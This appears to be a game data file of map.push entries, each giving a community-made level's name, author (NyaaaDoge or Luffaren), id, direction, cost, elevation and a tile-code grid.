maps.push({name="3 2 1 Water crouch",author="NyaaaDoge",id="#1675236654",direction="forward",cost=272,elevation=1,map=[0,0,0,0,0,1,1,0,0,2,2,0,0,0,1,1,0,0,0,0,0,0,0,0,1,9,131,1,0,6,6,0,0,1,131,9,1,0,0,0,0,0,0,0,1,65,65,1,0,7,7,0,0,1,65,65,1,0,0,0,0,0,0,0,1,65,65,1,0,8,8,0,0,1,65,65,1,0,0,0,0,0,0,0,1,65,65,1,0,65,65,0,0,1,65,65,1,0,0,0,0,0,0,0,1,9,65,65,65,9,9,65,65,65,65,9,1,0,0,0,0,0,0,0,0,1,9,9,9,1,1,9,9,9,9,1,0,0,0,0,0,0,0,0,0,1,1,1,1,0,0,1,1,1,1,0,0,0,0,0,0,0,0,0,1,132,8,1,0,0,0,1,65,65,9,1,0,0,0,0,0,0,0,1,8,8,8,1,0,0,1,65,65,65,9,1,0,0,0,0,0,0,0,1,9,9,1,0,0,1,8,9,65,65,9,1,0,0,0,0,0,0,0,1,65,65,1,0,1,91,91,8,1,65,9,1,0,0,0,0,0,0,0,1,65,65,1,1,8,91,91,1,1,65,9,1,0,0,0,0,0,0,0,1,65,65,65,65,9,8,1,0,1,65,9,1,0,0,0,0,0,0,0,0,1,9,65,65,65,1,0,0,1,133,9,1,0,0,0,0,0,0,0,0,0,1,1,1,1,21,0,11,0,1,1,0,0,0,0,0,0,0,0,0,1,134,1,0,0,154,156,153,0,0,0,0,0,0,0,0,0,0,0,1,8,8,1,1,1,1,1,1,1,1,1,0,0,0,0,0,0,0,1,100,9,9,65,65,8,8,8,7,7,7,7,1,0,0,0,0,0,1,88,9,9,65,65,65,8,8,8,7,2,2,7,1,0,0,0,0]});
maps.push({name="sth down inside",author="NyaaaDoge",id="#1675592450",direction="left",cost=292,elevation=-5,map=[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,19,19,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,18,18,17,17,0,0,0,0,0,67,77,67,77,67,0,0,0,0,0,0,18,18,17,17,0,0,0,1,39,38,37,37,36,35,34,34,0,0,0,0,0,0,16,16,0,0,1,1,52,51,50,50,49,15,14,90,34,34,0,0,0,0,16,16,0,1,54,53,52,51,50,50,49,49,48,14,14,90,34,0,0,0,15,15,114,90,54,53,52,1,110,110,49,49,48,142,48,14,90,34,34,0,15,15,114,54,54,53,1,51,50,50,1,15,14,48,48,100,14,14,14,34,14,14,114,54,90,1,52,51,50,50,50,1,14,48,24,48,87,48,100,14,14,14,2,54,54,39,52,1,50,50,141,16,108,88,48,24,48,90,48,48,14,14,2,54,54,39,52,1,50,50,141,16,108,93,48,24,48,87,48,93,14,14,114,54,90,1,52,51,50,50,50,1,14,48,24,48,90,48,100,14,14,14,114,54,54,53,1,51,50,50,1,15,14,48,48,100,14,14,14,34,0,0,114,90,54,53,52,1,110,110,49,49,48,142,48,14,90,34,34,0,0,0,0,1,54,53,52,51,50,50,49,49,48,14,14,90,34,0,0,0,0,0,0,0,1,1,52,51,50,50,49,15,14,90,34,34,0,0,0,0,0,0,0,0,0,1,39,38,37,37,36,35,34,34,0,0,0,0,0,0,0,0,0,0,0,0,0,67,77,67,77,67,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="Dont get lost",author="NyaaaDoge",id="#1675592490",direction="left",cost=322,elevation=-1,map=[0,0,0,0,0,0,0,0,0,0,0,0,0,1,119,2,2,119,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,119,119,119,119,1,0,0,0,0,0,0,0,1,0,0,0,1,0,0,1,119,119,119,119,1,0,0,0,0,0,1,1,119,1,1,1,119,1,1,1,119,1,91,1,0,0,0,0,0,1,93,91,119,91,89,1,119,1,132,91,119,91,94,1,0,0,0,0,0,1,91,1,119,1,91,1,119,1,1,1,119,1,91,1,0,0,0,0,1,119,119,119,119,119,119,119,119,119,119,119,119,119,119,119,1,0,0,0,0,1,91,1,119,1,91,1,119,1,1,1,119,1,91,1,0,0,0,0,0,1,87,91,119,1,125,91,119,1,86,91,119,91,144,1,0,0,0,0,0,1,1,1,119,1,91,1,119,1,91,1,119,1,1,1,0,0,0,0,1,119,119,119,119,119,119,119,119,119,119,119,119,119,119,119,1,0,0,0,0,1,1,1,119,1,91,1,119,1,91,1,119,1,1,1,0,0,0,0,0,5,92,91,119,91,131,1,119,1,90,91,119,91,132,1,0,0,0,0,0,1,1,1,19,1,91,1,119,1,1,1,119,1,91,1,0,0,1,1,1,90,119,19,19,19,119,119,119,119,119,119,119,119,119,119,1,0,18,18,18,1,91,1,19,1,91,1,119,1,1,1,119,1,1,1,0,0,2,18,18,119,119,91,119,91,88,1,119,91,127,91,119,91,80,1,0,0,2,18,18,119,119,1,90,1,1,1,119,1,19,1,119,1,1,0,0,0,18,18,18,1,1,0,1,0,0,0,1,0,0,0,1,0,0,0,0,0,1,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="ofc ZM open dat hold",author="NyaaaDoge",id="#1675592529",direction="right",cost=231,elevation=-5,map=[19,2,2,19,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,1,19,19,19,19,0,0,94,1,1,1,1,1,0,0,0,0,0,1,100,100,0,19,19,17,16,14,12,10,8,8,8,99,8,0,0,0,0,1,44,44,0,19,19,0,0,0,0,1,1,1,1,1,98,0,0,0,0,1,141,141,0,18,18,0,0,0,0,0,8,8,8,8,8,0,0,0,0,1,34,34,0,18,18,0,0,0,0,0,10,0,0,0,0,0,0,0,0,1,131,131,0,17,17,0,0,0,0,0,12,0,0,0,0,38,0,0,0,1,41,41,0,17,17,0,0,0,0,0,13,0,0,0,0,98,0,0,0,1,97,0,0,16,16,0,0,0,0,0,127,0,0,38,98,93,98,0,0,1,38,43,0,16,16,0,0,0,0,0,0,0,38,98,94,93,94,98,38,1,0,3,0,15,15,0,0,0,0,0,0,0,0,38,98,93,98,0,0,1,0,199,0,15,15,0,0,0,0,0,0,0,0,0,0,98,0,0,36,1,0,0,0,14,14,0,0,0,0,0,0,0,0,0,0,38,0,0,0,1,0,140,0,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,35,1,0,140,0,14,14,0,0,0,0,143,143,143,0,0,0,0,0,0,0,1,0,140,0,14,14,0,0,0,0,114,114,114,0,0,0,0,0,0,0,14,14,14,154,14,14,14,14,114,96,114,114,114,114,114,14,14,14,14,14,14,14,2,153,14,14,14,14,114,96,114,132,114,114,114,14,14,14,14,14,14,14,2,0,0,0,0,0,0,0,114,114,114,1,0,0,0,0,0,0,14,14,14,0,0,0,0,0,0,0,1,1,1,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="Treading around",author="Luffaren",id="#1676980124",direction="right",cost=300,elevation=19,map=[0,0,93,24,90,5,2,2,5,90,24,0,0,91,0,0,91,0,0,100,0,0,93,24,5,5,5,5,5,5,24,0,0,44,0,0,44,0,0,44,0,0,93,24,5,94,5,5,94,5,24,0,0,145,0,0,145,0,0,145,0,0,93,24,24,1,5,5,1,24,24,0,0,0,0,0,0,0,0,0,0,0,0,0,24,24,185,185,24,24,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,24,5,5,24,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,24,24,185,185,24,24,0,0,0,0,0,0,0,0,0,0,0,0,0,0,24,1,5,5,1,24,0,0,0,0,0,0,0,0,0,0,0,0,0,0,24,90,5,5,90,24,24,24,24,24,24,0,0,0,0,0,0,0,0,0,24,5,5,94,5,185,5,185,5,5,24,0,0,0,0,0,0,0,0,0,24,5,94,5,5,185,5,185,5,5,24,0,0,0,0,0,0,0,0,0,24,90,5,5,90,24,24,24,185,185,24,24,24,24,24,24,0,0,24,24,24,24,24,24,24,24,24,24,5,5,24,24,89,24,24,24,0,24,24,24,24,89,24,24,24,24,89,24,185,185,24,24,24,24,24,24,24,24,24,89,24,24,24,24,24,24,24,24,5,5,24,24,24,24,24,2,24,24,24,24,24,24,24,89,24,24,24,24,185,185,24,24,24,24,24,2,24,24,24,24,24,24,24,24,24,1,90,5,5,5,5,90,24,89,24,24,125,14,13,12,11,10,9,8,7,6,5,5,5,89,5,5,24,24,24,24,3,14,13,12,11,10,9,8,7,6,5,89,5,5,5,5,24,24,24,24,24,24,24,24,24,24,24,24,24,1,90,5,5,5,5,90,24,24,0,0]});
maps.push({name="Anubis teaser",author="Luffaren",id="#1677162055",direction="forward",cost=182,elevation=6,map=[0,0,0,0,0,0,19,15,19,2,2,19,19,15,0,0,0,0,0,0,0,0,0,0,0,0,19,90,9,9,9,9,90,15,0,0,0,0,0,0,0,0,0,0,0,0,18,9,9,9,9,9,9,19,0,0,0,0,0,0,0,0,0,0,0,0,19,9,94,95,95,94,9,18,0,0,0,0,0,0,0,0,0,0,0,0,19,12,12,9,9,12,12,19,0,0,0,0,0,0,0,0,0,0,0,0,18,14,12,10,10,12,14,19,0,0,0,0,0,0,0,0,0,0,0,0,19,12,9998,11,11,9998,12,18,0,0,0,0,0,0,0,0,0,0,0,0,20,12,12,12,12,12,12,19,0,0,0,0,0,0,0,0,0,0,0,0,19,12,88,12,12,88,12,19,0,0,0,0,0,0,0,0,0,0,0,0,20,12,12,12,12,12,12,21,0,0,0,0,0,0,0,0,0,0,0,0,21,12,12,12,12,12,12,20,0,0,0,0,0,0,0,0,0,0,0,0,21,12,93,95,95,93,12,21,0,0,0,0,0,0,0,0,0,0,0,0,21,15,15,12,12,15,15,21,0,0,0,0,0,0,0,0,0,0,0,0,24,17,15,13,13,15,17,21,0,0,0,0,0,0,0,0,0,0,0,0,21,15,9998,14,14,9998,15,22,0,0,0,0,0,0,0,0,0,0,0,0,21,15,15,15,15,15,15,21,0,0,0,0,0,0,0,0,0,0,0,0,22,15,88,15,15,88,15,21,0,0,0,0,0,0,0,0,0,0,0,0,21,95,95,95,95,95,95,24,0,0,0,0,0,0,0,0,0,0,0,0,21,17,15,15,15,15,17,21,0,0,0,0,0,0,0,0,0,0,0,0,22,21,21,2,2,21,21,24,0,0,0,0,0,0]});
maps.push({name="Tribulations",author="Luffaren",id="#1677250691",direction="right",cost=446,elevation=4,map=[19,19,19,19,5,2,2,5,0,67,0,3,0,0,0,0,67,9,89,9,19,89,19,19,185,185,185,185,19,19,19,12,0,0,0,0,67,9,9,2,19,19,19,19,185,185,185,185,53,93,53,12,0,0,0,0,67,9,9,2,19,19,89,19,185,185,185,185,19,89,19,96,0,0,145,29,95,95,95,95,19,19,19,19,65,5,5,65,19,19,19,96,0,0,0,0,0,9,9,0,24,95,95,24,65,89,5,65,1,18,18,12,67,0,0,0,0,9,89,9,0,19,19,24,65,5,5,65,19,17,17,12,67,0,145,29,95,95,95,95,24,95,95,24,65,5,5,65,1,16,16,12,67,0,0,0,0,89,9,0,0,19,19,24,65,5,89,65,19,15,15,12,67,0,0,0,0,9,9,9,24,95,95,24,65,5,5,65,1,14,14,12,67,0,145,29,95,95,95,95,19,19,19,19,65,5,5,65,19,13,13,9998,0,0,0,0,0,9,9,0,19,19,89,19,65,89,5,65,1,12,12,12,0,0,0,0,0,9,9,9,19,19,19,19,5,5,5,5,19,11,11,11,0,0,145,29,96,96,96,96,9998,18,18,9998,5,125,125,5,1,10,10,10,0,0,0,0,0,9,9,0,19,17,17,19,5,5,5,5,19,9,9,9,0,0,67,0,0,9,89,9,19,16,16,1,94,5,5,94,19,65,9,89,9,30,31,30,9,9,9,9,19,15,15,1,14,14,14,14,19,65,9,9,9,30,31,30,9,89,9,9,19,15,15,14,14,14,96,96,19,65,9,9,9,30,31,30,9,9,9,91,19,15,15,14,14,14,96,14,19,9,9,9998,0,0,67,0,0,9,91,9,19,19,19,1,14,96,96,3,19,19,19,93,0,0,0,0,0,91,9,97]});
maps.push({name="Look beneath",author="Luffaren",id="#1677434552",direction="forward",cost=421,elevation=0,map=[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,34,2,2,34,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,34,14,14,34,0,0,148,148,148,148,148,148,148,148,148,148,148,0,0,0,95,14,14,95,0,0,148,148,148,148,148,148,148,148,148,148,148,0,0,0,95,95,95,95,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,34,34,34,34,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,89,34,34,89,0,0,0,0,0,3,0,3,0,0,0,0,3,0,3,0,34,89,89,34,34,34,34,34,34,14,34,14,34,93,48,34,14,34,14,34,34,89,89,34,90,94,94,90,34,34,34,34,34,48,93,34,34,34,34,34,90,34,34,90,93,16,16,34,34,184,184,184,184,184,184,184,184,184,184,34,34,16,16,34,34,16,16,34,34,184,184,184,184,184,184,184,184,184,184,34,34,16,16,34,90,34,34,90,34,34,34,34,34,48,93,34,34,34,34,34,90,94,94,90,34,89,89,34,34,14,34,14,34,97,48,34,14,34,14,34,34,34,34,34,34,89,89,34,0,3,0,3,0,0,0,0,3,0,3,0,0,0,0,0,89,34,34,89,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,34,34,34,34,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,96,96,96,96,0,0,0,148,148,148,148,148,148,148,148,148,148,148,0,0,96,14,14,96,0,0,0,148,148,148,148,148,148,148,148,148,148,148,0,0,34,14,14,34,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,34,2,2,34,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="Down she goes",author="Luffaren",id="#1677434575",direction="forward",cost=387,elevation=-19,map=[93,5,5,5,5,5,5,94,0,0,0,0,0,0,0,1,24,2,2,24,5,1,1,1,1,1,1,5,0,0,0,0,0,0,0,1,24,184,184,24,5,1,97,105,95,105,95,5,0,0,0,0,0,0,0,1,24,184,184,24,5,1,1,1,1,1,1,89,0,0,0,0,0,0,0,1,89,24,24,24,94,5,5,5,5,5,5,5,6,6,6,6,0,0,0,1,22,22,22,22,5,65,65,65,65,65,65,5,6,65,65,6,0,42,96,42,22,184,184,22,5,65,65,65,65,65,65,5,6,65,65,6,0,42,96,42,22,184,184,22,5,65,65,5,5,5,5,5,6,6,6,6,0,0,0,1,22,22,22,89,5,65,65,5,1,0,0,1,8,8,8,89,0,0,0,1,20,20,20,20,5,65,65,5,0,0,0,0,8,184,184,8,0,0,0,1,20,184,184,20,5,65,65,5,0,0,0,0,8,184,184,8,0,0,0,1,20,184,184,20,89,5,5,89,0,0,0,0,8,8,8,8,0,0,0,1,89,20,20,20,1,96,96,1,0,0,0,0,89,10,10,10,0,0,0,0,18,18,18,18,1,5,5,1,0,0,0,0,10,184,184,10,0,0,0,0,18,184,184,18,90,65,65,90,0,0,0,0,10,184,184,10,0,0,0,0,18,184,184,18,5,65,65,5,0,0,0,0,10,10,10,10,1,0,0,1,18,18,18,89,5,65,65,5,0,0,0,1,12,12,12,12,89,14,14,14,16,16,16,16,5,65,65,5,0,93,98,32,12,184,184,12,14,184,184,14,16,184,184,16,5,5,5,5,0,32,98,32,12,184,184,12,14,184,184,14,16,184,184,16,89,2,2,89,0,0,0,1,89,12,12,12,14,14,14,14,89,16,16,16]});
maps.push({name="Trust the floor",author="Luffaren",id="#1677434606",direction="forward",cost=216,elevation=-10,map=[0,0,0,0,0,0,0,0,94,2,2,94,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,24,24,24,24,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,23,23,23,23,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,22,22,22,22,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,21,21,21,21,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,20,20,20,20,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,19,19,19,19,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,18,18,18,18,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,17,17,17,17,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,16,16,16,16,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,15,15,15,15,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,14,14,14,14,1,0,0,0,0,0,0,0,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,65,14,183,183,183,183,183,183,183,183,183,183,183,183,183,183,14,65,14,14,14,14,183,183,183,183,183,183,183,183,183,183,183,183,183,183,14,14,14,24,24,14,183,183,183,183,183,183,183,183,183,183,183,183,183,183,14,24,24,100,24,14,183,183,183,183,183,183,183,183,183,183,183,183,183,183,14,24,100,93,24,14,183,183,183,183,183,183,183,183,183,183,183,183,183,183,14,24,93,24,24,14,183,183,183,183,183,14,14,14,14,183,183,183,183,183,14,24,24,141,14,14,14,14,14,14,14,89,2,2,89,14,14,14,14,14,14,14,141]});
maps.push({name="Bouncy boys",author="Luffaren",id="#1677434635",direction="forward",cost=267,elevation=-19,map=[24,2,2,24,24,67,0,0,0,0,0,0,0,0,0,0,0,0,0,0,24,24,24,24,24,67,0,0,0,0,0,0,0,0,0,0,0,0,0,0,24,24,24,24,24,67,0,0,0,0,0,0,0,0,0,0,0,0,0,0,24,24,24,24,24,67,0,0,0,0,0,0,0,0,0,0,0,0,0,0,24,24,24,24,24,67,0,0,0,0,0,0,0,0,0,0,0,0,0,0,24,24,24,24,24,67,0,0,0,0,0,0,0,0,0,0,0,0,0,0,3,5,5,5,3,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,65,65,65,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,65,65,65,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,65,131,65,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,65,65,65,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,65,65,65,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,3,5,5,5,3,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,24,24,24,24,24,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,24,24,24,24,24,0,0,0,0,0,0,0,0,67,67,67,67,67,67,0,24,24,24,24,24,1,0,1,0,1,0,1,5,159,159,159,159,159,159,5,24,24,24,24,24,95,24,95,24,95,24,24,5,65,65,65,65,65,65,5,0,24,24,24,24,95,24,95,24,95,24,24,5,65,65,65,65,65,65,5,0,0,24,24,24,95,24,95,24,95,24,24,5,65,65,65,65,65,65,5,0,0,0,24,24,1,0,1,0,1,0,1,5,5,5,5,5,2,2,5]});
maps.push({name="Take the train",author="Luffaren",id="#1677434669",direction="forward",cost=117,elevation=0,map=[0,0,0,0,0,0,0,0,5,2,2,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,94,5,5,94,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,89,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,0,0,0,0,0,0,0,0,0,5,186,0,5,186,0,5,186,0,5,186,0,0,0,0,0,0,0,0,0,176,0,0,175,0,0,174,0,0,173,0,0,0,0,0,0,0,0,193,0,170,0,0,170,0,0,170,0,0,170,0,0,0,0,0,0,0,0,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,188,0,177,5,186,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,170,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,178,5,186,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,170,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,170,0,0,170,0,0,170,0,0,170,0,0,170,0,0,170,0,179,5,0,180,5,0,181,5,0,182,5,0,190,5,0,191,5,0,192,0,170,188,0,0,188,0,0,188,0,0,188,0,0,188,0,0,188,0,5,0,0,0,0,0,0,0,0,5,5,5,5,5,5,5,0,0,0,0,188,0,0,0,0,0,0,0,0,5,89,5,5,7,17,19,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,9,15,21,5,0,24,100,0,0,0,0,0,0,0,0,0,89,2,2,5,11,13,23,93,0,24,93,0]});
maps.push({name="Grand leap",author="Luffaren",id="#1677434694",direction="forward",cost=335,elevation=-19,map=[127,2,2,127,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,24,24,24,24,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,94,24,24,94,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,24,24,24,24,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,24,24,24,24,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,24,24,24,24,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,24,24,24,24,0,0,0,0,0,0,67,67,67,67,67,67,67,67,67,1,24,127,127,24,0,0,0,0,0,67,65,65,65,65,65,65,65,65,65,5,24,24,24,24,0,0,0,0,0,67,65,65,65,65,65,65,65,65,65,5,24,24,24,129,0,0,0,0,0,67,65,65,65,65,65,65,65,65,65,5,24,89,24,129,0,0,0,0,0,67,65,65,65,65,65,65,65,65,65,5,24,24,24,129,0,0,0,0,0,67,65,65,65,65,65,65,65,65,65,5,89,24,24,129,0,0,0,0,0,67,65,65,65,65,65,65,65,65,65,5,24,24,24,24,0,0,0,0,0,67,65,65,65,65,65,65,65,65,65,5,199,199,199,199,0,0,0,0,0,0,67,67,67,67,67,67,1,5,5,5,0,0,0,0,199,0,0,0,0,0,0,0,0,0,0,0,5,5,5,89,0,0,0,0,0,199,199,199,199,199,199,199,199,199,199,0,5,5,89,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,145,0,0,145,25,0,145,25,0,0,0,0,0,0,0,0,5,5,5,5,25,100,0,0,93,0,0,93,0,0,25,0,0,25,0,0,89,2,2,89]});
maps.push({name="Round nRound nRound",author="Luffaren",id="#1677440029",direction="forward",cost=472,elevation=19,map=[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,2,2,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,94,5,5,94,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,5,0,0,0,0,0,67,67,67,67,67,67,67,67,67,0,5,65,65,162,67,93,24,93,0,7,7,7,7,7,7,7,7,7,7,8,5,65,65,162,67,24,100,24,0,6,11,11,11,11,11,11,11,11,12,8,5,65,65,162,67,93,24,93,0,6,10,15,15,15,15,15,15,16,12,8,5,65,65,162,67,0,44,0,67,6,10,14,19,19,19,19,20,16,12,8,5,65,65,162,67,0,96,0,67,6,10,14,18,23,23,23,20,16,12,8,5,65,65,162,67,0,96,0,67,6,10,14,18,22,24,24,20,16,12,8,5,65,65,162,67,0,44,0,67,6,10,14,17,21,24,24,20,16,12,8,5,65,65,162,67,24,24,24,0,6,10,14,17,20,185,185,20,16,12,8,5,65,65,162,67,24,97,24,0,6,10,14,17,17,185,185,17,17,12,8,5,65,65,162,67,24,24,24,0,6,10,14,13,13,185,185,13,13,13,8,5,5,5,5,5,5,185,5,5,5,10,9,9,9,185,185,9,9,9,9,95,95,95,96,96,5,185,5,5,5,95,5,5,5,185,185,5,5,5,5,5,5,5,96,96,5,185,5,89,5,95,89,5,5,185,185,5,5,89,5,5,89,5,96,5,5,185,5,5,5,95,5,5,5,185,185,5,5,5,5,5,5,5,96,3,90,24,90,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,89,2,2,89,24,24,24,24,24,94,94,24]});
maps.push({name="God im so wet rn",author="Luffaren",id="#1677440833",direction="forward",cost=878,elevation=0,map=[160,2,2,160,0,199,0,162,162,162,162,162,162,162,162,162,162,162,160,160,160,160,160,160,0,199,0,162,162,162,162,162,162,162,162,162,162,162,160,160,160,160,160,160,0,199,0,159,159,162,162,162,162,162,162,162,162,160,160,160,160,160,160,160,0,199,0,159,159,159,159,162,162,162,162,162,162,160,160,160,160,160,160,160,0,199,0,159,159,159,159,0,0,0,0,0,160,160,160,160,160,160,160,160,0,199,0,159,159,159,159,0,199,0,0,0,160,160,160,160,160,160,160,160,0,199,0,159,159,159,159,0,199,0,0,0,160,160,160,160,160,160,160,160,0,199,0,159,159,159,159,0,199,0,0,0,160,160,160,160,160,160,160,160,0,199,0,159,159,159,159,0,199,0,0,0,160,160,160,160,160,160,160,160,0,199,0,159,159,159,159,0,199,0,0,0,160,160,160,160,160,160,160,160,0,199,0,159,159,159,159,0,199,0,0,0,160,160,160,160,160,160,160,160,0,199,0,159,159,159,159,0,199,0,0,0,160,160,160,160,160,160,160,160,0,199,0,159,159,159,159,0,199,0,67,65,65,65,65,65,160,160,160,160,0,199,0,159,159,159,159,0,199,0,67,65,65,65,65,65,160,160,160,160,0,199,0,159,159,159,159,0,199,0,67,65,65,65,65,65,160,160,160,160,0,0,0,159,159,159,159,0,199,0,67,65,65,65,65,65,160,160,160,160,162,162,162,162,159,159,159,0,199,0,67,65,65,65,65,65,160,160,162,162,162,162,162,162,159,159,159,0,199,0,67,65,65,65,65,65,162,162,162,162,162,162,162,162,162,159,159,0,199,0,67,65,65,65,65,65,162,162,162,162,162,162,162,162,162,159,159,0,199,0,67,65,65,2,2,65]});
maps.push({name="Just trust the W",author="Luffaren",id="#1677442002",direction="forward",cost=200,elevation=-17,map=[0,0,0,0,145,44,44,44,44,2,2,44,44,44,44,145,0,0,0,0,0,0,0,0,145,44,183,183,183,183,183,183,183,183,44,145,0,0,0,0,0,0,0,0,145,43,183,183,183,183,183,183,183,183,43,145,0,0,0,0,0,0,0,0,145,42,183,183,183,183,183,183,183,183,42,145,0,0,0,0,0,0,0,0,145,41,183,183,183,183,183,183,183,183,41,145,0,0,0,0,0,0,0,0,145,40,183,183,183,183,183,183,183,183,40,145,0,0,0,0,0,0,0,0,145,39,183,183,183,183,183,183,183,183,39,145,0,0,0,0,0,0,0,0,145,38,183,183,183,183,183,183,183,183,38,145,0,0,0,0,0,0,0,0,145,37,183,183,183,183,183,183,183,183,37,145,0,0,0,0,0,0,0,0,145,36,183,183,183,183,183,183,183,183,36,145,0,0,0,0,0,0,0,0,145,35,183,183,183,183,183,183,183,183,35,145,0,0,0,0,0,0,0,0,145,34,183,183,183,183,183,183,183,183,34,145,0,0,0,0,0,0,0,0,145,33,183,183,183,183,183,183,183,183,33,145,0,0,0,0,0,0,0,0,145,32,183,183,183,183,183,183,183,183,32,145,0,0,0,0,0,0,0,0,145,31,183,183,183,183,183,183,183,183,31,145,0,0,0,0,0,0,0,0,145,30,183,183,183,183,183,183,183,183,30,145,0,0,0,0,0,0,0,0,145,29,183,183,183,183,183,183,183,183,29,145,0,0,0,0,0,0,0,0,145,28,183,183,183,183,183,183,183,183,28,145,0,0,0,0,0,0,0,0,145,27,183,183,183,183,183,183,183,183,27,145,0,0,0,0,0,0,0,0,145,27,27,27,27,2,2,27,27,27,27,145,0,0,0,0]});
maps.push({name="Jump in my dude",author="Luffaren",id="#1677442576",direction="forward",cost=224,elevation=0,map=[0,0,0,0,0,0,0,14,14,2,2,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,14,14,14,14,0,0,0,0,0,0,0,0,0,0,0,0,14,14,14,14,14,14,14,14,14,14,0,0,0,0,0,0,0,0,0,0,14,14,14,14,14,14,14,14,14,14,0,0,0,0,0,0,0,0,0,0,14,66,66,14,14,14,14,66,66,14,0,0,0,0,0,0,0,0,0,0,14,66,66,14,14,14,14,66,66,14,0,0,0,0,0,0,0,0,0,0,14,68,68,14,94,94,14,68,68,14,0,0,0,0,0,0,0,0,0,0,14,68,68,14,14,14,14,68,68,14,0,0,0,0,0,0,0,0,183,1,19,69,69,69,69,69,69,69,69,19,1,183,0,0,0,0,0,0,183,1,19,69,69,69,69,69,69,69,69,19,1,183,0,0,0,0,0,0,0,0,14,14,14,14,68,68,14,14,14,14,0,0,0,0,0,0,0,0,0,0,14,14,89,14,68,68,14,89,14,14,0,0,0,0,0,0,0,0,0,0,0,0,14,14,66,66,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,66,66,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,14,14,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,14,14,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,93,93,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,14,14,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,14,14,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,89,89,2,2,89,89,0,0,0,0,0,0,0]});
